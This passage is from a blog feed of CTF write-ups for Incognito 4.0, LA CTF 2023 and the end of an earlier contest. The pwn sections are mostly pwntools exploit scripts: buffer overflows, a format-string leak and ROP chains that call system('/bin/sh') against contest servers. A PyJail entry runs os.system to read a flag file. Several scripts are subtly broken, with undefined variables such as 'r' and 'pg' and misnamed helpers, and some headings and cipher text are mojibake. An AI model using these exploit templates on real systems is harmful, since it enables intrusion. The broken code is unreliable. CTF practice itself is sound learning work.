12631302718057472129138289484187738038805661685759196779990368768599115569927115234126312113575785471158626604808250556471019475882601443785660157133230999298014824293609691681149195181799904358979944719852988436666306120350671288382565369084160416022015445829639878167524217607450918100132212115997395372780, 42899381454706854217031716361682990989382003331688973566655317536112884234898037025883907894505663567670829738793956574655657437562098921910867502135260835097785409348930680677890714703165271668372795217905436049326872168290466249129739381681341323649536725632009485619857375114283009023943744880775769510652]</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯-4"><a href="#è§£é¢˜æ€è·¯-4" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>cs = [<span class="hljs-number">183098212086317720236828757315510192339273033804875740822801041376722387458993552796227899411901966324318366514880536763913315608412750265815750386810801443666072579873995967676472994916617708760086271155827496223499121301339946900578686321571238854410077055150282805741312173826325669295346629270100887114</span>, <span class="hljs-number">57033027040944100515577298747833062983449034346155581535109171399667991971614122726451624246276583123688811765412755210627513537740891720491136798691017567675611749056264437247135506921747135448387155606513983563110678466501221603978172670533058510913876368172674768929417846635764813733749021238273031358064</span>, <span class="hljs-number">44177513422937659688192503808032734159830361147993789424022745838993946766432456884886189398779755202878679629523667923807343226973440318127947558457476925179848208108399587026072741947465486816791306581859876197942191253278120326733144030253277598039138046967591357892542649422324554104602547660747339872074</span>, <span class="hljs-number">12631302718057472129138289484187738038805661685759196779990368768599115569927115234126312113575785471158626604808250556471019475882601443785660157133230999298014824293609691681149195181799904358979944719852988436666306120350671288382565369084160416022015445829639878167524217607450918100132212115997395372780</span>, <span class="hljs-number">42899381454706854217031716361682990989382003331688973566655317536112884234898037025883907894505663567670829738793956574655657437562098921910867502135260835097785409348930680677890714703165271668372795217905436049326872168290466249129739381681341323649536725632009485619857375114283009023943744880775769510652</span>]<br>n = GCD(cs[<span class="hljs-number">0</span>]**<span class="hljs-number">2</span> - cs[<span class="hljs-number">2</span>], cs[<span class="hljs-number">0</span>]*cs[<span class="hljs-number">1</span>] - cs[<span class="hljs-number">4</span>]) // <span class="hljs-number">2</span><br>m = discrete_log_lambda(Zmod(n)(cs[<span class="hljs-number">0</span>]), Zmod(n)(<span class="hljs-number">2</span>), (<span class="hljs-number">0</span>, <span class="hljs-number">2</span>**<span class="hljs-number">47</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment"># tql!!!</span><br></code></pre></td></tr></table></figure><h3 id="6-Check-In"><a href="#6-Check-In" class="headerlink" title="6. Check In"></a>6. Check In</h3><h4 id="é¢˜ç›®è¯´æ˜-5"><a href="#é¢˜ç›®è¯´æ˜-5" class="headerlink" title="é¢˜ç›®è¯´æ˜"></a>é¢˜ç›®è¯´æ˜</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">282422904082982258621075610259452215824075271484821245626055284049965141753838118483499225118037659155776469308266679236514939371151200503486860900710638249138056870980395564136760046944176702722154502092895865522544199762580857041717582699398798829888596539858995029585412945532785867079274113878154724845910389733183058666310229884356997245</span><br></code></pre></td></tr></table></figure><h4 id="è§£é¢˜æ€è·¯-5"><a href="#è§£é¢˜æ€è·¯-5" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h4><p>åè¿›åˆ¶è½¬hex ç„¶åhexè½¬å­—ç¬¦<br><img src="/mdimg/%E9%BB%84%E6%B2%B3/1.png"><br><img src="/mdimg/%E9%BB%84%E6%B2%B3/2.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Incognito 4.0</title>
    <link href="/2023/02/18/Incognito4/"/>
    <url>/2023/02/18/Incognito4/</url>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-get-flag-1"><a href="#1-get-flag-1" class="headerlink" title="1.  get flag 1"></a>1.  get flag 1</h3><p><code>[http://0.0.0.0:9001/flag.txt](http://0.0.0.0:9001/flag.txt)</code><br><img src="/mdimg/Incognito4/1.png"></p><h3 id="2-get-flag-2"><a href="#2-get-flag-2" class="headerlink" title="2.  get flag 2"></a>2.  get flag 2</h3><p><code>http://[::]:9001/flag.txt</code><br><img src="/mdimg/Incognito4/2.png"></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="1-babyFlow"><a href="#1-babyFlow" class="headerlink" title="1.  babyFlow"></a>1.  babyFlow</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;143.198.219.171&#x27;</span>,<span class="hljs-number">5000</span>)<br>p.recv()<br>g = (<span class="hljs-number">0x14</span>+<span class="hljs-number">4</span>)*<span class="hljs-string">&#x27;a&#x27;</span>+p32(<span class="hljs-number">0x80491fc</span>)<br>p.sendline(g)<br>p.interactive()<br><br><span class="hljs-comment">#ictf&#123;bf930bcd-6c10-4c05-bdd8-435db4b50cdb&#125;</span><br></code></pre></td></tr></table></figure><h3 id="2-Gainme"><a href="#2-Gainme" class="headerlink" title="2.  Gainme"></a>2.  Gainme</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;i386&#x27;</span><br>p  = remote(<span class="hljs-string">&#x27;143.198.219.171&#x27;</span>,<span class="hljs-number">5003</span>)<br>p.recvline()<br>p.recvuntil(<span class="hljs-string">&#x27;Level 0:&#x27;</span>)<br>p.sendline(<span class="hljs-string">&quot;ICTF4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Level 1:&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;dasDASQWgjtrkodsc&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Level 2:&#x27;</span>)<br>p.sendline(p64(<span class="hljs-number">0xDEADBEEF</span>))<br>p.recvuntil(<span class="hljs-string">&#x27;Level 3:&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.interactive()<br><br><span class="hljs-comment">#ictf&#123;g@inm3-sf23f-4fd2150cd33db&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="1-Meow"><a href="#1-Meow" class="headerlink" title="1.  Meow"></a>1.  Meow</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">data=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Meow&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br><span class="hljs-built_in">print</span>(data[<span class="hljs-number">1</span>::<span class="hljs-number">2</span>].decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br><br><span class="hljs-comment">#ictf&#123;easiest_challenge_of_them_all&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="1-Ancient"><a href="#1-Ancient" class="headerlink" title="1.  Ancient"></a>1.  Ancient</h3><p>The downloaded file needs to manually add the png file header<br><img src="/mdimg/Incognito4/3.png"></p><p><img src="/mdimg/Incognito4/4.png"><br><a href="https://jsom1.github.io/_challenges/templed">https://jsom1.github.io/_challenges/templed</a><br>The original question of another competition, you can manually convert it to the table<br><img src="/mdimg/Incognito4/5.png"></p><h3 id="2-Crypto1"><a href="#2-Crypto1" class="headerlink" title="2.  Crypto1"></a>2.  Crypto1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;result&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    cy = f.read()<br><span class="hljs-built_in">print</span>(cy)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(cy))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">f, i</span>):<br>    <span class="hljs-keyword">if</span> i&lt;<span class="hljs-number">5</span>:<br>        out = <span class="hljs-built_in">ord</span>(f) ^ <span class="hljs-number">0x76</span> ^ <span class="hljs-number">0xAD</span><br>        var1 = (out &amp; <span class="hljs-number">0xAA</span>) &gt;&gt; <span class="hljs-number">1</span><br>        var2 = <span class="hljs-number">2</span> * out &amp; <span class="hljs-number">0xAA</span><br>        <span class="hljs-keyword">return</span> var1 | var2 <br>    <span class="hljs-keyword">elif</span> i&gt;=<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> i&lt;<span class="hljs-number">10</span>:<br>        out = <span class="hljs-built_in">ord</span>(f) ^ <span class="hljs-number">0x76</span> ^ <span class="hljs-number">0xBE</span><br>        var1 = (out &amp; <span class="hljs-number">0xCC</span>) &gt;&gt; <span class="hljs-number">2</span><br>        var2 = <span class="hljs-number">4</span> * out &amp; <span class="hljs-number">0xCC</span><br>        <span class="hljs-keyword">return</span> var1 | var2<br>    <span class="hljs-keyword">else</span>:<br>        out = <span class="hljs-built_in">ord</span>(f) ^ <span class="hljs-number">0x76</span> ^ <span class="hljs-number">0xEF</span><br>        var1 = (out &amp; <span class="hljs-number">0xF0</span>) &gt;&gt; <span class="hljs-number">4</span><br>        var2 = <span class="hljs-number">16</span> * out &amp; <span class="hljs-number">0xF0</span><br>        <span class="hljs-keyword">return</span> var1 | var2<br><br>dic = &#123;&#125;<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">128</span>):<br>        t = <span class="hljs-built_in">chr</span>(func(<span class="hljs-built_in">chr</span>(j), i))<br>        <span class="hljs-keyword">if</span> t==cy[i]:<br>            <span class="hljs-built_in">print</span>(i, <span class="hljs-built_in">chr</span>(j), j)<br>            flag += <span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#ictf&#123;88f30d1cd1ab443&#125;</span><br></code></pre></td></tr></table></figure><h2 id="PyJail"><a href="#PyJail" class="headerlink" title="PyJail"></a>PyJail</h2><h3 id="1-TheOnlyJail"><a href="#1-TheOnlyJail" class="headerlink" title="1.  TheOnlyJail"></a>1.  TheOnlyJail</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br><br>os.system(b64.base64decode(<span class="hljs-string">&quot;some_base64_encoded_command_like_cat /home/ctf/flag.txt&quot;</span>))<br></code></pre></td></tr></table></figure><h2 id="sanity"><a href="#sanity" class="headerlink" title="sanity"></a>sanity</h2><h3 id="1-sanity"><a href="#1-sanity" class="headerlink" title="1. sanity"></a>1. sanity</h3><p><img src="/mdimg/Incognito4/6.png"></p><h3 id="2-more-sanity"><a href="#2-more-sanity" class="headerlink" title="2.more sanity"></a>2.more sanity</h3><p><img src="/mdimg/Incognito4/7.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LA CTF 2023</title>
    <link href="/2023/02/14/LACTF2023/"/>
    <url>/2023/02/14/LACTF2023/</url>
    
    <content type="html"><![CDATA[<p><img src="/mdimg/LACTF2023/lactf.gif"></p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><h4 id="1-gatekeep"><a href="#1-gatekeep" class="headerlink" title="1. gatekeep"></a>1. gatekeep</h4><p>There is an overflow in the gets() function, so if the input is greater than char s1[15], the check() function can be bypassed and the flag can be obtained.</p><p><img src="/mdimg/LACTF2023/6.png"></p><h4 id="2-bot"><a href="#2-bot" class="headerlink" title="2. bot"></a>2. bot</h4><p><code>gets()</code> has an overflow, and <code>strcmp()</code> has a bug where it stops reading input after a NULL byte. So the question asks you to take the input, then compare it to some string before returning it. All you have to do is write a NULL byte-terminated string, and the write buffer overflows.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>, <span class="hljs-number">31180</span>)<br>p.recv()<br>g = <span class="hljs-string">b&quot;may i have the flag?\0&quot;</span><br>g += <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">64</span>-<span class="hljs-built_in">len</span>(g))<br>g += <span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span><br>g += p64(<span class="hljs-number">0x40129a</span>)<br>p.sendline(g)<br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="3-rut-roh-relro"><a href="#3-rut-roh-relro" class="headerlink" title="3.rut-roh-relro"></a>3.<strong>rut-roh-relro</strong></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./rut_roh_relro&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>,<span class="hljs-number">31134</span>)<br>elf = ELF(<span class="hljs-string">&quot;./rut_roh_relro&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>, <span class="hljs-string">&#x27;--new-tab&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">src</span>):<br>    gdb.attach(p,src)<br>    pause()<br><br>src = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *$rebase(0x11C6)</span><br><span class="hljs-string">b *$rebase(0x1201)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># dbg(src)</span><br>g=<span class="hljs-string">&quot;%71$p %72$p&quot;</span><br>p.sendlineafter(<span class="hljs-string">&quot;What would you like to post?&quot;</span>,g)<br><br>p.recvuntil(<span class="hljs-string">&quot;Here&#x27;s your latest post:\n&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot; &quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">234</span> - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base = &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>stack_addr = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>ret_stack = stack_addr - <span class="hljs-number">0xf0</span><br>success(<span class="hljs-string">&quot;ret_stack = &quot;</span>+<span class="hljs-built_in">hex</span>(ret_stack))<br><br>start_stack = stack_addr - <span class="hljs-number">0xf0</span> - <span class="hljs-number">0x20</span><br><br>gadget = <span class="hljs-number">0xc967a</span><br>one_gadget = libc_base+gadget<br><br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>pop_rdi_ret = libc_base + <span class="hljs-number">0x0000000000023796</span><br><br>g = fmtstr_g(<span class="hljs-number">6</span>, &#123;ret_stack:pop_rdi_ret,ret_stack+<span class="hljs-number">8</span>:bin_sh,ret_stack+<span class="hljs-number">0x10</span>:system_addr&#125;, write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;What would you like to post?&quot;</span>,pg)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="4-redact"><a href="#4-redact" class="headerlink" title="4.redact"></a>4.redact</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./redact&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;lac.tf&quot;</span>,<span class="hljs-number">31181</span>)<br>elf = ELF(<span class="hljs-string">&quot;./redact&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context(arch=<span class="hljs-string">&quot;amd64&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;terminator&#x27;</span>, <span class="hljs-string">&#x27;--new-tab&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">src</span>):<br>    gdb.attach(p,src)<br>    pause()<br><br>src = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *0x40149a</span><br><span class="hljs-string">b *0x4012F9</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pop_rdi_ret = <span class="hljs-number">0x000000000040177b</span><br>pop_rsi_r15_ret = <span class="hljs-number">0x0000000000401779</span><br>start_addr = <span class="hljs-number">0x401120</span><br><br><span class="hljs-comment"># dbg(src)</span><br>g=<span class="hljs-string">&#x27;a&#x27;</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter some text: &quot;</span>,g)<br><br>g=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi_ret)+p64(<span class="hljs-number">0x4040C0</span>)+p64(pop_rsi_r15_ret)+p64(<span class="hljs-number">0x403FE8</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x4010C0</span>)+p64(start_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Enter a placeholder: &quot;</span>,g)<br><br>index = <span class="hljs-number">0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter the index of the stuff to redact: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>libc_base = u64(r.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc_base = &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>system_addr = libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base+libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br><br>g=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi_ret)+p64(bin_sh)+p64(system_addr)<br>p.sendlineafter(<span class="hljs-string">&quot;Enter a placeholder: &quot;</span>,g)<br>index = <span class="hljs-number">0</span><br>p.sendlineafter(<span class="hljs-string">&quot;Enter the index of the stuff to redact: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="1-one-more-time-pad"><a href="#1-one-more-time-pad" class="headerlink" title="1. one-more-time-pad"></a>1. one-more-time-pad</h4><p>Just XOR.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br>pt = <span class="hljs-string">b&quot;Long ago, the four nations lived together in harmony ...&quot;</span><br>ct = <span class="hljs-number">0x200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e</span><br>ct=long_to_bytes(<span class="hljs-built_in">int</span>(ct))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ct)):<br>    flag = (pt[i] ^ ct[i])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#lactf&#123;b4by_h1t_m3_0ne_m0r3_t1m3&#125;</span><br></code></pre></td></tr></table></figure><h4 id="2-chinese-lazy-theorem-1"><a href="#2-chinese-lazy-theorem-1" class="headerlink" title="2. chinese-lazy-theorem-1"></a>2. chinese-lazy-theorem-1</h4><p>Make the modulus greater than the maximum value of the target, which is p*q, to leak the target, and then get the flag according to the target.<br><img src="/mdimg/LACTF2023/1.png"></p><h4 id="3-rolling-in-the-mud"><a href="#3-rolling-in-the-mud" class="headerlink" title="3. rolling in the mud"></a>3. rolling in the mud</h4><p><img src="/mdimg/LACTF2023/2.png"><br>Solve the pigsty password.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;eombmcvcalebupauntcnjppmjfnicnappmjfnippmjfni&#125;</span><span class="language-xml">dugip</span><br></code></pre></td></tr></table></figure><p>After the reverse order, use quip to blast.</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">lactf</span><span class="hljs-template-variable">&#123;rolling_and_rolling_and_rolling_until_the_pigs_go_home&#125;</span><br></code></pre></td></tr></table></figure><h4 id="4-greek-cipher"><a href="#4-greek-cipher" class="headerlink" title="4. greek cipher"></a>4. greek cipher</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haxe">ÎºÏ‚Îº Ï‰Ï€Î½ Î±Î¶Ï€Î» Î¹Î·ÏƒÎ¹ Ï‡Î½Î¿Ï‚Î½Î¸ Î¼ÏƒÎ³Î¸ÏƒÏ Î»ÏƒÎ¸ Î¶Ï€Î¹ Î¹Î·Î³ Î´Ï‚ÏÎ¸Î¹ ÏˆÎ³ÏÎ¸Ï€Î¶ Ï‚Î¶ Î·Ï‚Î¸Î¹Ï€ÏÏ‰ Î¸Î½Î¸ÏˆÎ³Î¼Î¹Î³Îº Ï€Î´ Î½Î¸Ï‚Î¶Îµ Î³Î¶Î¼ÏÏ‰ÏˆÎ¹Ï‚Ï€Î¶? Ï„Î³ Î¶Î³Ï‚Î¹Î·Î³Ï. ÎºÏ‚Îº Ï‰Ï€Î½ Î±Î¶Ï€Î» Î¹Î·ÏƒÎ¹ Ï‡Î½Î¿Ï‚Î½Î¸ Î¼ÏƒÎ³Î¸ÏƒÏ Î»ÏƒÎ¸ ÏˆÏÏ€Î¾ÏƒÎ¾Î¿Ï‰ Î´Î¿Î½Î³Î¶Î¹ Ï‚Î¶ ÎµÏÎ³Î³Î±? Ï„Î³ Î¶Î³Ï‚Î¹Î·Î³Ï. Ï‚ Î¿Ï‚Î±Î³ Î·Ï€Î» ÎµÏÎ³Î³Î± Î¼Î·ÏƒÏÏƒÎ¼Î¹Î³Ï Î¿Ï€Ï€Î± Î¹Î·Ï€Î½ÎµÎ·, Î³Ï…Î³Î¶ Ï‚Î´ Ï‚ Î¼ÏƒÎ¶<span class="hljs-string">&#x27;Î¹ ÏÎ³ÏƒÎº Î¹Î·Î³Ï„. Î¿ÏƒÎ¼Î¹Î´&#123;Ï‚_ÎµÎ½Î³Î¸Î¸_Î½Î¸Ï‚Î¶Îµ_Ï„ÏƒÎ¶Ï‰_ÎµÏÎ³Î³Î±_Î¼Î·ÏƒÏÏƒÎ¼Î¹Î³ÏÎ¸_ÎºÏ‚ÎºÎ¶&#x27;</span>Î¹<span class="hljs-literal">_</span>Î¸Î¹Ï€Ïˆ<span class="hljs-literal">_</span>Ï‰Ï€Î½<span class="hljs-number">._</span>Î»Î³Î¿Î¿<span class="hljs-literal">_</span>ÏˆÎ¿ÏƒÏ‰Î³Îº<span class="hljs-literal">_</span>Ï‚<span class="hljs-literal">_</span>Ï„Î½Î¸Î¹<span class="hljs-literal">_</span>Î¸ÏƒÏ‰.Î¼Ï€Î¶ÎµÏÏƒÎ¹Î¸!&#125;<br>print(<span class="hljs-string">&#x27;&#x27;</span>.join(sorted(<span class="hljs-keyword">set</span>(input()))))<br></code></pre></td></tr></table></figure><p>This code implements the de-reordering function of a string. It takes user input as a string, converts it to a set, and removes duplicate 